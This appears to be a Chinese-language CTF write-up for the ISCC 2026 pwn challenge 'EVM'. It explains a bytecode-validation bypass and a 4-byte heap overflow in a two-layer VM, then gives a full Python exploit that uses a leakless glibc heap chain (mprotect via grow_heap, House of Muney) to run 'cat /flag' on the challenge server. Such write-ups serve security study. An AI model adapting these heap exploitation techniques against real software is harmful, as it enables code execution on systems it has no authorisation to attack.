+++
title = "EVM"
date = "2026-05-18"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

Pwn-Pwn3-EVM

解题思路（必须包含文字说明+截图）

1. 程序架构分析

拿到题目附件 evm.zip，解压得到 pwn 二进制、libc.so.6 和 ld-linux-x86-64.so.2。用 checksec 查看保护：

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

题目实现了一个双层虚拟机架构。程序启动后先接收外层 EVM（类 RISC-V 指令集）的代码长度、数据页数量以及原始字节码，执行完 EVM 阶段后再进入内层 BlindVM。

从逆向结果看，程序的输入协议如下：

```
<evm_code_len>\n          ← 十进制文本
<evm_data_pages>\n        ← 十进制文本  
<raw evm code>            ← 二进制
[raw data pages]          ← 可选
<blind_len>\n             ← 十进制文本
<mode>\n                  ← 十进制文本
<raw blind bytes>         ← 二进制
```

关键发现：内层 BlindVM 的字节码在 EVM 执行前会被校验，要求必须全部为重复的 `13 00 00 00`（即 RISC-V 的 nop 指令 addi x0, x0, 0）。如果直接发送恶意字节码，会在校验阶段被拒绝。

（截图：程序入口流程，展示输入协议解析和校验逻辑）

2. 外层 EVM 的绕过——自定义 opcode 0x2f

外层 EVM 实现了一套类 RISC-V 指令集，包括标准的 load(0x03)、ALU(0x13)、store(0x23)、lui(0x37)、branch(0x63)、jal(0x6f) 等。

但真正关键的是一条自定义指令 0x2f。与普通 store 不同，0x2f 不走页表权限检查，而是直接在 arena 内存区域按偏移量写入数据：

```
0x2f 行为：以 rs1 + offset 作为 arena 内偏移，直接写入 1/2/4/8 字节
```

而 BlindVM 的字节码恰好存放在 arena 的固定偏移 0x300000 处。这意味着我们可以：

- 先提交合法的占位字节码（全 13 00 00 00）通过校验
- 再用 EVM 的 0x2f 或 data-page copy 将 arena 中的占位码原地改写成真正的攻击载荷
- 最后让 BlindVM 执行已被篡改的字节码

（截图：0x2f 指令的实现逻辑，展示其绕过权限检查直接写 arena 的代码路径）

3. 内层 BlindVM 漏洞分析——edit 的 +4 溢出

BlindVM 只有三种操作：

| 操作码 | 功能 | 记录格式 |
|--------|------|----------|
| 0x00 | alloc | [tag:1B][size:u32] |
| 0x01 | edit | [tag:1B][idx:u32][len:u32][data:len bytes] |
| 0x02 | exit/free_all | [tag:1B] |

漏洞点在 edit 操作中。解释器在拷贝用户数据时，实际拷贝长度计算为：

```c
copy_len = min(chunk_size + 4, 0xfff);
memcpy(chunk_ptr, user_data, copy_len);
```

也就是说，每次 edit 都能稳定地向后溢出 4 字节。虽然只有 4 字节，但在 ptmalloc 中足以覆盖：
- 相邻 chunk 的 size 字段低 4 字节
- top chunk 的 size 低位
- heap_info 结构体的关键字段

（截图：edit 操作的反编译代码，标注出 copy_len 计算和 memcpy 调用位置）

4. 漏洞利用——无泄漏高版本 glibc 堆利用链

由于题目环境是较新的 libc（2.35+），tcache 的 fd 指针被 XOR 加密保护，传统 leak 方式受限。我们采用公开的 BlindVM 类题解思路——无需泄漏的堆布局操纵链。

整体攻击分为五个阶段：

阶段一：堆喷射填补空洞
利用 BlindVM 的 alloc 原语，按页递减大小从 0x1ff80 到 0x20000 大量申请 chunk。目的是把主堆区和目标 libc 对齐 heap space 之间的未映射区域用 mmap 填满，为后续 top chunk 推进铺路。

阶段二：利用 +4 溢出操纵 top chunk
通过精心布局，让一个可控 chunk 恰好位于 top chunk 前方。利用 edit 的 +4 溢出修改 top chunk 的 size 字段，使后续大块申请触发 top chunk 扩展，让 old_top 逐步向 libc 所在内存区域靠近。

阶段三：修补 heap_info->ar_ptr
当 top chunk 进入新的 heap space 后，继续申请会触发 glibc 对 heap_info->ar_ptr 的断言检查。我们构造一个 unsorted bin chunk，使其 fd 指针恰好落在目标 heap_info->ar_ptr 位置，再通过 edit 低字节修改使得该字段指向合法 arena 地址。

阶段四：借助 grow_heap 的 mprotect 修改 libc 页属性
当 old_top 对齐到 libc 所在的 heap space 后，再次触发扩容进入 grow_heap()：

```c
__mprotect((char *)h + h->mprotect_size,
           new_size - h->mprotect_size,
           PROT_READ | PROT_WRITE);
```

我们伪造的 heap_info 使得 mprotect 作用在 libc 的只读页上，将其改为可读写。

阶段五：改写 free 解析链为 system
libc 页变为可写后，采用类似 House of Muney 的手法，将 free 函数的解析路径重定向到 system。最后调用 BlindVM 的 exit/free_all，第一个 chunk 中存放的是 "cat /flag" 命令字符串，于是：

```
free(chunk0) → system("cat /flag")
```

（截图：堆布局示意图，展示各阶段 chunk 排列和 overflow 位置）

5. 本地验证

使用题目自带的 loader 和 libc 在 pwn_ubuntu24 容器中验证：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit.bin; echo EXIT:$?'
```

得到 EXIT:0，确认协议还原和 bypass 路线正确。

外层 data-page copy 的 smoke test 也通过，证明"先校验再改写"的策略可行：

```bash
docker run --rm --platform linux/amd64 -v "$PWD:/work" -w /work pwn_ubuntu24 \
  /bin/bash -lc './ld-linux-x86-64.so.2 --library-path . ./pwn < test_exit_via_data.bin; echo EXIT:$?'
# 输出: EXIT:0
```

而早期的直接 GOT overwrite 尝试返回 EXIT:2，确认该路径在 EVM 权限检查处失败，间接验证了本题必须通过 BlindVM 的堆原语完成利用。

Exp

```python
#!/usr/bin/env python3
"""
ISCC 2026 Pwn3-EVM Exploit
双层VM利用：外层EVM绕过校验 → 内层BlindVM堆利用 → system("cat /flag")
"""
import struct
import socket
import sys
import re

# ---------- 常量 ----------
HEAP_MAX  = 0x4000000
MIN_SIZE  = 0x20
MMAP_THR  = 0x20000
PAGE_SZ   = 0x1000
TLS_OFF   = 0x800000

def u32(v): return struct.pack('<I', v & 0xFFFFFFFF)
def u64(v): return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)

# ---------- EVM 指令构造 ----------
def insn_u(opc, rd, imm20):
    return ((imm20 & 0xFFFFF) << 12) | (rd << 7) | opc

def insn_i(opc, rd, f3, rs1, imm):
    return ((imm & 0xFFF) << 20) | (rs1 << 15) | (f3 << 12) | (rd << 7) | opc

def insn_b(opc, f3, rs1, rs2, off):
    off &= 0x1FFE
    return ((off & 0x1000) << 19) | ((off & 0x7E0) << 20) | (rs2 << 20) | \
           (rs1 << 15) | (f3 << 12) | ((off & 0x1E) << 7) | ((off & 0x800) >> 4) | opc

def insn_xst(rs1, rs2, f3, off):
    return ((off >> 5) << 25) | (rs2 << 20) | (rs1 << 15) | (f3 << 12) | \
           ((off & 0x1F) << 7) | 0x2F

def dw(v): return struct.pack('<I', v & 0xFFFFFFFF)

def build_copy_loop(nbytes, src=0x1000, dst=0x300000):
    """生成将 data page 内容拷贝到 BlindVM 区域的 EVM 代码"""
    assert nbytes > 0 and nbytes % 4 == 0
    end_addr = src + nbytes
    code = []
    code.append(insn_u(0x37, 1, src >> 12))       # lui x1, src_page
    code.append(insn_u(0x37, 2, dst >> 12))       # lui x2, dst_page
    code.append(insn_u(0x37, 3, end_addr >> 12))  # lui x3, end_page
    loop = len(code) * 4
    code.append(insn_i(0x03, 4, 6, 1, 0))         # lw x4, 0(x1)
    code.append(insn_xst(2, 4, 2, 0))             # custom store to arena
    code.append(insn_i(0x13, 1, 0, 1, 4))         # addi x1, x1, 4
    code.append(insn_i(0x13, 2, 0, 2, 4))         # addi x2, x2, 4
    br_pc = len(code) * 4
    delta = loop - (br_pc + 4)
    code.append(insn_b(0x63, 6, 1, 3, delta))     # bne x1, x3, loop
    code.append(0x13)                               # nop
    return b''.join(dw(x) for x in code)

def make_outer_payload(blind_exp):
    """将 BlindVM exp 封装为外层 payload"""
    padded = (len(blind_exp) + 3) & ~3
    npages = max(1, (padded + 0xFFF) // 0x1000)
    data = blind_exp.ljust(npages * 0x1000, b'\x00')
    evm_code = build_copy_loop(padded)
    placeholder = (b'\x13\x00\x00\x00' * ((padded + 3) // 4))[:padded]
    
    out = str(len(evm_code)).encode() + b'\n'
    out += str(npages).encode() + b'\n'
    out += evm_code + data
    out += str(padded).encode() + b'\n0\n' + placeholder
    return out

# ---------- BlindVM 堆利用 ----------
records = []
rec_idx = -1

def bl_alloc(size):
    global rec_idx
    records.append(b'\x00' + u32(size))
    rec_idx += 1

def bl_edit(idx, data):
    records.append(b'\x01' + u32(idx) + u32(len(data)) + data)

def bl_exit():
    records.append(b'\x02')

# ---- 攻击开始 ----
# 1. 第一个chunk存放命令字符串
bl_alloc(0x204a0 - 0x8 - MIN_SIZE)
bl_edit(rec_idx, b'cat /flag;cat /flag.txt;cat flag.txt\x00')

# 2. 堆喷射填充gap区
for _ in range(0x1FF):
    bl_alloc(MMAP_THR - 0x8 - 0x10)
bl_alloc(PAGE_SZ * 2 + 0x11)
for _ in range(0x1FF):
    bl_alloc(MMAP_THR - 0x8 - 0x10)
bl_alloc(0x1FF80 - 0x20)
bl_alloc(PAGE_SZ * 2 + 0x11)

# 3. 递减申请逼近目标区域
fake_data = b'\x00' * 0x20 + u64(0x1020) + u64(0x10) + u64(0x10) + u64(0x1)
sz = HEAP_MAX - PAGE_SZ
while sz >= MMAP_THR:
    bl_alloc(sz - 0x8)
    bl_edit(rec_idx, fake_data)
    sz -= PAGE_SZ

# 4. 第一次 +4 溢出修改相邻chunk size
bl_alloc(0x18)
bl_edit(rec_idx, b'\x00' * 0x18 + u32(0x1021))
bl_alloc(0xFE0 - 8)
bl_alloc(0x20 - 8)
bl_edit(rec_idx, b'\x30')
bl_alloc(0x20 - 8)

# 5. 继续堆喷推动top chunk
for _ in range(0x1FF - 1):
    bl_alloc(MMAP_THR - 0x8 - 0x10)
bl_alloc(0x1FF80 - 0x20 - 0x20)
bl_alloc(0x18)
bl_edit(rec_idx, b'\x00' * 0x18 + u32(HEAP_MAX * 2 + 0x21))
bl_alloc(HEAP_MAX // 2 - 0x8)
bl_alloc(HEAP_MAX // 2 + 0x18)
bl_alloc(0x18)
bl_edit(rec_idx, u64(0x21000) + u64(0x21000) + u64(0x1000))

# 6. 逐页修补 heap_info 字段
sz = HEAP_MAX - PAGE_SZ
fix_i = 0x402
while sz >= MMAP_THR:
    patch = u64(sz + 2 * PAGE_SZ + TLS_OFF) + \
            u64(sz + 2 * PAGE_SZ + TLS_OFF) + \
            u64(0x1000) + \
            u64(sz + 0x1FE0 + TLS_OFF + 1)
    sz -= PAGE_SZ
    bl_edit(fix_i, patch)
    fix_i += 1

# 7. 最终阶段：触发 grow_heap → mprotect → House of Muney
bl_alloc(0x13C0 - 0x28)
for _ in range((0x800000 + 0x1FE0) // (MMAP_THR - 0x8 - 0x10)):
    bl_alloc(MMAP_THR - 0x8 - 0x10)

sz = HEAP_MAX - PAGE_SZ
while sz >= MMAP_THR:
    bl_alloc(sz)
    sz -= PAGE_SZ

bl_alloc(0x3000)
bl_alloc(0xD4D0 + 0x8)
bl_alloc(0x18)
bl_edit(rec_idx, u64(0x0F001200004DDE) + u64(0x50D70) + u64(0x101))
bl_exit()

# ---------- 发送 ----------
blind_stream = b''.join(records)
final_payload = make_outer_payload(blind_stream)

target = sys.argv[1] if len(sys.argv) > 1 else '39.96.193.120:8888'
host, port = target.split(':')
port = int(port)

print(f'[*] BlindVM exp size: {len(blind_stream)} bytes')
print(f'[*] Full payload size: {len(final_payload)} bytes')
print(f'[*] Connecting to {host}:{port}...')

s = socket.create_connection((host, port), timeout=15)
s.settimeout(15)
s.sendall(final_payload)

data = b''
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
except Exception:
    pass
s.close()

result = data.decode(errors='replace')
print(result)

flag = re.search(rb'ISCC\{[^}]+\}', data)
if flag:
    print(f'\n[+] FLAG -> {flag.group(0).decode()}')
```
